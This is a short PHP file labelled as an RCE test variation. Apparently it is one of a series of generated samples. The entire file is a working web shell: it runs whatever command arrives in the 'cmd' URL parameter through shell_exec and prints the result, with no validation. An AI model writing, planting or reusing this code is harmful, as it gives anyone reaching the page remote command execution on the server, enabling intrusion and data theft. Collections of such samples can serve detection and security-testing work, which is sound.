<?php
// RCE test variation #924
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>